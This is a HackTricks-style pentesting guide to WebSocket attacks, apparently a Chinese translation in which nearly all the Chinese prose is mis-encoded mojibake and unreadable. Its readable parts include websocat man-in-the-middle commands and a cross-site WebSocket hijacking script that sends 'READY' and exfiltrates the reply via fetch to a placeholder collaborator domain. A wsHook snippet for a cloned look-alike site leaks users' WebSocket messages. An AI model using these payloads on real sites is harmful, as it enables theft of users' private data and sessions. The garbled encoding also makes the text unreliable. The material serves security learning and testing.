# WebSocket æ”»å‡»

<details>

<summary><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹  AWS é»‘å®¢æ”»å‡»</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ **HackTricks** ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFTs é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥**åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

## ä»€ä¹ˆæ˜¯ WebSockets

WebSocket è¿æ¥æ˜¯é€šè¿‡ **HTTP** å‘èµ·çš„ï¼Œé€šå¸¸æ˜¯**é•¿æœŸå­˜åœ¨**çš„ã€‚æ¶ˆæ¯å¯ä»¥åœ¨**ä»»ä½•æ—¶é—´åŒå‘å‘é€**ï¼Œå¹¶ä¸”ä¸æ˜¯äº‹åŠ¡æ€§çš„ã€‚è¿æ¥é€šå¸¸ä¼šä¿æŒæ‰“å¼€å’Œç©ºé—²çŠ¶æ€ï¼Œç›´åˆ°å®¢æˆ·ç«¯æˆ–æœåŠ¡å™¨å‡†å¤‡å‘é€æ¶ˆæ¯ã€‚\
WebSockets åœ¨éœ€è¦**ä½å»¶è¿Ÿæˆ–æœåŠ¡å™¨å‘èµ·æ¶ˆæ¯**çš„æƒ…å†µä¸‹ç‰¹åˆ«æœ‰ç”¨ï¼Œä¾‹å¦‚é‡‘èæ•°æ®çš„å®æ—¶æä¾›ã€‚

### WebSocket è¿æ¥æ˜¯å¦‚ä½•å»ºç«‹çš„ï¼Ÿ

(è¿™é‡Œæ‚¨å°†æ‰¾åˆ°ä¸€ä¸ªæ€»ç»“ï¼Œä½†å…³äºå¦‚ä½•åˆ›å»º web socket è¿æ¥çš„**æ›´è¯¦ç»†æŒ‡å—**å¯ä»¥åœ¨[**è¿™é‡Œ**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc)æ‰¾åˆ°)ã€‚\
WebSocket è¿æ¥é€šå¸¸ä½¿ç”¨ç±»ä¼¼ä»¥ä¸‹çš„å®¢æˆ·ç«¯ JavaScript åˆ›å»ºï¼š
```javascript
var ws = new WebSocket("wss://normal-website.com/ws");
```
**`wss`** åè®®é€šè¿‡åŠ å¯†çš„ **TLS** è¿æ¥å»ºç«‹ WebSocketï¼Œè€Œ **`ws`** åè®®ä½¿ç”¨æœªåŠ å¯†çš„è¿æ¥ã€‚

ä¸ºäº†å»ºç«‹è¿æ¥ï¼Œæµè§ˆå™¨å’ŒæœåŠ¡å™¨é€šè¿‡ HTTP æ‰§è¡Œ WebSocket æ¡æ‰‹ã€‚æµè§ˆå™¨å‘å‡ºç±»ä¼¼ä»¥ä¸‹çš„ WebSocket æ¡æ‰‹è¯·æ±‚ï¼š
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
å¦‚æœæœåŠ¡å™¨æ¥å—è¿æ¥ï¼Œå®ƒä¼šè¿”å›å¦‚ä¸‹çš„WebSocketæ¡æ‰‹å“åº”ï¼š
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
åœ¨è¿™ä¸€ç‚¹ä¸Šï¼Œç½‘ç»œè¿æ¥ä¿æŒæ‰“å¼€çŠ¶æ€ï¼Œå¹¶ä¸”å¯ä»¥ç”¨æ¥åœ¨ä»»ä¸€æ–¹å‘å‘é€WebSocketæ¶ˆæ¯ã€‚

**æ³¨æ„**

WebSocket **æ¡æ‰‹**æ¶ˆæ¯çš„å‡ ä¸ª**ç‰¹ç‚¹**å€¼å¾—æ³¨æ„ï¼š

* è¯·æ±‚å’Œå“åº”ä¸­çš„ **`Connection`** å’Œ **`Upgrade`** å¤´éƒ¨**è¡¨æ˜**è¿™æ˜¯ä¸€ä¸ª**WebSocketæ¡æ‰‹**ã€‚
* **`Sec-WebSocket-Version`** è¯·æ±‚å¤´æŒ‡å®šå®¢æˆ·ç«¯å¸Œæœ›ä½¿ç”¨çš„**WebSocketåè®®ç‰ˆæœ¬**ã€‚é€šå¸¸æ˜¯ `13`ã€‚
* **`Sec-WebSocket-Key`** è¯·æ±‚å¤´åŒ…å«ä¸€ä¸ªBase64ç¼–ç çš„**éšæœºå€¼**ï¼Œæ¯ä¸ªæ¡æ‰‹è¯·æ±‚ä¸­åº”è¯¥éšæœºç”Ÿæˆã€‚
* **`Sec-WebSocket-Accept`** å“åº”å¤´åŒ…å«ä¸€ä¸ªå“ˆå¸Œå€¼ï¼Œè¯¥å€¼æ˜¯å°† `Sec-WebSocket-Key` è¯·æ±‚å¤´ä¸­æäº¤çš„å€¼ä¸åè®®è§„èŒƒä¸­å®šä¹‰çš„ç‰¹å®šå­—ç¬¦ä¸²è¿æ¥åå¾—åˆ°çš„ã€‚è¿™æ ·åšæ˜¯ä¸ºäº†é˜²æ­¢ç”±äºæœåŠ¡å™¨é…ç½®é”™è¯¯æˆ–ç¼“å­˜ä»£ç†è€Œäº§ç”Ÿçš„è¯¯å¯¼æ€§å“åº”ã€‚

**`Sec-WebSocket-Key`** å¤´éƒ¨åŒ…å«ä¸€ä¸ª**éšæœºå€¼**ï¼Œä»¥é˜²æ­¢æ¥è‡ªç¼“å­˜ä»£ç†çš„é”™è¯¯ï¼Œå¹¶ä¸”**ä¸ç”¨äºè®¤è¯æˆ–ä¼šè¯å¤„ç†ç›®çš„**ï¼ˆ_å®ƒä¸æ˜¯CSRFä»¤ç‰Œ_ï¼‰ã€‚

### Linuxæ§åˆ¶å°

ä½ å¯ä»¥ä½¿ç”¨ `websocat` æ¥å»ºç«‹ä¸websocketçš„åŸå§‹è¿æ¥ã€‚
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
æˆ–è€…åˆ›å»ºä¸€ä¸ª websocat æœåŠ¡å™¨ï¼š
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### ä¸­é—´äººæ”»å‡»websocketè¿æ¥

å¦‚æœä½ å‘ç°å®¢æˆ·ç«¯æ­£åœ¨ä½ å½“å‰çš„æœ¬åœ°ç½‘ç»œä¸­è¿æ¥åˆ°ä¸€ä¸ª**HTTP websocket**ï¼Œä½ å¯ä»¥å°è¯•ä¸€ä¸ª[ARP Spoofing Attack](../generic-methodologies-and-resources/pentesting-network/#arp-spoofing)æ¥æ‰§è¡Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„MitMæ”»å‡»ã€‚\
ä¸€æ—¦å®¢æˆ·ç«¯å°è¯•è¿æ¥ï¼Œä½ å¯ä»¥ä½¿ç”¨ï¼š
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Websockets æšä¸¾

æ‚¨å¯ä»¥ä½¿ç”¨å·¥å…· [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) è‡ªåŠ¨å‘ç°ã€æŒ‡çº¹è¯†åˆ«å¹¶æœç´¢ websockets ä¸­çš„å·²çŸ¥æ¼æ´ã€‚

### Websocket è°ƒè¯•å·¥å…·

* **Burp Suite** æ”¯æŒ MitM websockets é€šä¿¡ï¼Œå…¶æ–¹å¼ä¸å¸¸è§„ HTTP é€šä¿¡éå¸¸ç›¸ä¼¼ã€‚
* [**socketsleuth**](https://github.com/snyk/socketsleuth) **Burp Suite æ‰©å±•**å°†å…è®¸æ‚¨é€šè¿‡è·å–**å†å²è®°å½•**ã€è®¾ç½®**æ‹¦æˆªè§„åˆ™**ã€ä½¿ç”¨**åŒ¹é…å’Œæ›¿æ¢**è§„åˆ™ã€ä½¿ç”¨**Intruder** å’Œ **AutoRepeater** æ›´å¥½åœ°ç®¡ç† Burp ä¸­çš„ Websocket é€šä¿¡ã€‚
* [**WSSiP**](https://github.com/nccgroup/wssip)ï¼šç®€ç§° "**WebSocket/Socket.io ä»£ç†**"ï¼Œè¿™ä¸ªåŸºäº Node.js çš„å·¥å…·æä¾›äº†ä¸€ä¸ªç”¨æˆ·ç•Œé¢ï¼Œç”¨äº**æ•è·ã€æ‹¦æˆªã€å‘é€è‡ªå®šä¹‰**æ¶ˆæ¯å¹¶æŸ¥çœ‹å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´æ‰€æœ‰ WebSocket å’Œ Socket.IO é€šä¿¡ã€‚
* [**wsrepl**](https://github.com/doyensec/wsrepl) æ˜¯ä¸€ä¸ªä¸ºæ¸—é€æµ‹è¯•ä¸“é—¨è®¾è®¡çš„**äº¤äº’å¼ websocket REPL**ã€‚å®ƒæä¾›äº†ä¸€ä¸ªç•Œé¢ï¼Œç”¨äºè§‚å¯Ÿ**ä¼ å…¥çš„ websocket æ¶ˆæ¯å¹¶å‘é€æ–°æ¶ˆæ¯**ï¼Œå¹¶æä¾›äº†ä¸€ä¸ªæ˜“äºä½¿ç”¨çš„æ¡†æ¶æ¥**è‡ªåŠ¨åŒ–**è¿™ç§é€šä¿¡ã€‚
* [**https://websocketking.com/**](https://websocketking.com/) æ˜¯ä¸€ä¸ª**ç½‘é¡µï¼Œç”¨äº**ä½¿ç”¨**websockets**ä¸å…¶ä»–ç½‘é¡µé€šä¿¡ã€‚
* [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) åœ¨å…¶ä»–ç±»å‹çš„é€šä¿¡/åè®®ä¸­ï¼Œå®ƒæä¾›äº†ä¸€ä¸ª**ç½‘é¡µï¼Œç”¨äº**ä½¿ç”¨**websockets**ä¸å…¶ä»–ç½‘é¡µé€šä¿¡ã€‚

## Websocket å®éªŒå®¤

åœ¨ [**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) ä¸­ï¼Œæ‚¨æœ‰ä¸€ä¸ªä»£ç å¯ä»¥å¯åŠ¨ä¸€ä¸ªä½¿ç”¨ websockets çš„ç½‘é¡µï¼Œåœ¨[**è¿™ç¯‡æ–‡ç« **](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/)ä¸­å¯ä»¥æ‰¾åˆ°è§£é‡Šã€‚

## è·¨ç«™ WebSocket åŠ«æŒ (CSWSH)

ä¹Ÿç§°ä¸º _è·¨æº WebSocket åŠ«æŒ_ã€‚\
**å®ƒæ˜¯** [**è·¨ç«™è¯·æ±‚ä¼ªé€  (CSRF)**](csrf-cross-site-request-forgery.md) **åœ¨ WebSocket æ¡æ‰‹ä¸Šçš„åº”ç”¨ã€‚**

å½“**WebSocket æ¡æ‰‹**è¯·æ±‚ä»…ä¾èµ–**HTTP cookies**è¿›è¡Œä¼šè¯å¤„ç†å¹¶**ä¸åŒ…å«ä»»ä½• CSRF ä»¤ç‰Œ**æˆ–å…¶ä»–ä¸å¯é¢„æµ‹çš„å€¼æ—¶ï¼Œå°±ä¼šå‡ºç°è¿™ç§æƒ…å†µã€‚\
æ”»å‡»è€…å¯ä»¥åœ¨ä»–ä»¬è‡ªå·±çš„åŸŸä¸Šåˆ›å»ºä¸€ä¸ª**æ¶æ„ç½‘é¡µ**ï¼Œè¯¥ç½‘é¡µ**å»ºç«‹è·¨ç«™ WebSocket**è¿æ¥åˆ°æ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºã€‚åº”ç”¨ç¨‹åºå°†åœ¨**å—å®³ç”¨æˆ·ä¸åº”ç”¨ç¨‹åºçš„ä¼šè¯ä¸Šä¸‹æ–‡ä¸­**å¤„ç†è¿æ¥ã€‚

### ç®€å•æ”»å‡»

è¯·æ³¨æ„ï¼Œåœ¨**å»ºç«‹**ä¸€ä¸ª**websocket**è¿æ¥æ—¶ï¼Œ**cookie**ä¼šè¢«**å‘é€**åˆ°æœåŠ¡å™¨ã€‚æœåŠ¡å™¨å¯èƒ½ä¼šä½¿ç”¨å®ƒæ¥**å…³è”**æ¯ä¸ª**ç‰¹å®š**ç”¨æˆ·ä¸ä»–çš„**websocket**ä¼šè¯ï¼ŒåŸºäºå‘é€çš„ cookieã€‚

ç„¶åï¼Œå¦‚æœ**ä¾‹å¦‚** websocket **æœåŠ¡å™¨**åœ¨æ”¶åˆ° "**READY"** æ¶ˆæ¯æ—¶**å‘é€å›ç”¨æˆ·çš„å¯¹è¯å†å²**ï¼Œé‚£ä¹ˆä¸€ä¸ª**ç®€å•çš„ XSS** å»ºç«‹è¿æ¥ï¼ˆ**cookie** å°†ä¼š**è‡ªåŠ¨å‘é€**ä»¥æˆæƒå—å®³ç”¨æˆ·ï¼‰**å‘é€** "**READY**" å°†èƒ½å¤Ÿ**æ£€ç´¢**å¯¹è¯çš„**å†å²è®°å½•**ã€‚
```markup
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### è·¨æº + ä¸åŒå­åŸŸçš„ Cookie

åœ¨è¿™ç¯‡åšå®¢æ–‡ç«  [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/) ä¸­ï¼Œæ”»å‡»è€…æˆåŠŸåœ°**åœ¨å­åŸŸä¸­æ‰§è¡Œä»»æ„ Javascript**ï¼Œè¯¥å­åŸŸå±äºæ­£åœ¨è¿›è¡Œ web socket é€šä¿¡çš„åŸŸã€‚å› ä¸ºå®ƒæ˜¯ä¸€ä¸ª**å­åŸŸ**ï¼Œ**cookie** è¢«**å‘é€**äº†ï¼Œç”±äº**Websocket æ²¡æœ‰æ­£ç¡®æ£€æŸ¥ Origin**ï¼Œå› æ­¤å¯ä»¥ä¸ä¹‹é€šä¿¡å¹¶**çªƒå–å…¶ä¸­çš„ tokens**ã€‚

### ä»ç”¨æˆ·å¤„çªƒå–æ•°æ®

å¤åˆ¶ä½ æƒ³è¦å†’å……çš„ web åº”ç”¨ç¨‹åºï¼ˆä¾‹å¦‚ .html æ–‡ä»¶ï¼‰ï¼Œå¹¶åœ¨å‘ç”Ÿ websocket é€šä¿¡çš„è„šæœ¬ä¸­æ·»åŠ ä»¥ä¸‹ä»£ç ï¼š
```javascript
//This is the script tag to load the websocket hooker
<script src='wsHook.js'></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function(data, url) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "client_msg?m="+data, true);
xhttp.send();
}
wsHook.after = function(messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "server_msg?m="+messageEvent.data, true);
xhttp.send();
return messageEvent;
}
```
ç°åœ¨ä» [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) ä¸‹è½½ `wsHook.js` æ–‡ä»¶ï¼Œå¹¶**å°†å…¶ä¿å­˜åœ¨åŒ…å«ç½‘é¡µæ–‡ä»¶çš„æ–‡ä»¶å¤¹å†…**ã€‚\
é€šè¿‡æš´éœ²ç½‘ç»œåº”ç”¨ç¨‹åºå¹¶ä½¿ç”¨æˆ·è¿æ¥åˆ°å®ƒï¼Œæ‚¨å°†èƒ½å¤Ÿé€šè¿‡websocketçªƒå–å‘é€å’Œæ¥æ”¶çš„æ¶ˆæ¯ï¼š
```javascript
sudo python3 -m http.server 80
```
## ç«æ€æ¡ä»¶

WebSockets ä¸­çš„ç«æ€æ¡ä»¶ä¹Ÿæ˜¯ä¸€ä¸ªé—®é¢˜ï¼Œ[æŸ¥çœ‹æ­¤ä¿¡æ¯ä»¥äº†è§£æ›´å¤š](race-condition.md#rc-in-websockets)ã€‚

## å…¶ä»–æ¼æ´

ç”±äº Web Sockets æ˜¯ä¸€ç§**å‘æœåŠ¡å™¨ç«¯å’Œå®¢æˆ·ç«¯å‘é€æ•°æ®çš„æœºåˆ¶**ï¼Œæ ¹æ®æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯å¤„ç†ä¿¡æ¯çš„æ–¹å¼ï¼Œ**Web Sockets å¯ä»¥è¢«ç”¨æ¥åˆ©ç”¨ XSSã€SQLi æˆ–ä»»ä½•å…¶ä»–å¸¸è§çš„ web æ¼æ´ï¼Œä½¿ç”¨ websocket çš„ç”¨æˆ·è¾“å…¥ã€‚**

## **WebSocket Smuggling**

è¿™ä¸ªæ¼æ´å¯èƒ½å…è®¸ä½ **ç»•è¿‡åå‘ä»£ç†çš„é™åˆ¶**ï¼Œè®©å®ƒä»¬ç›¸ä¿¡**å·²ç»å»ºç«‹äº† websocket é€šä¿¡**ï¼ˆå³ä½¿è¿™ä¸æ˜¯çœŸçš„ï¼‰ã€‚è¿™å¯èƒ½å…è®¸æ”»å‡»è€…**è®¿é—®éšè—çš„ç«¯ç‚¹**ã€‚æ›´å¤šä¿¡æ¯è¯·æŸ¥çœ‹ä»¥ä¸‹é¡µé¢ï¼š

{% content-ref url="h2c-smuggling.md" %}
[h2c-smuggling.md](h2c-smuggling.md)
{% endcontent-ref %}

## å‚è€ƒèµ„æ–™

{% embed url="https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages" %}

<details>

<summary><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹  AWS é»‘å®¢æ”»å‡»ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœä½ æƒ³åœ¨ **HackTricks ä¸­çœ‹åˆ°ä½ çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹çš„ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFTs é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
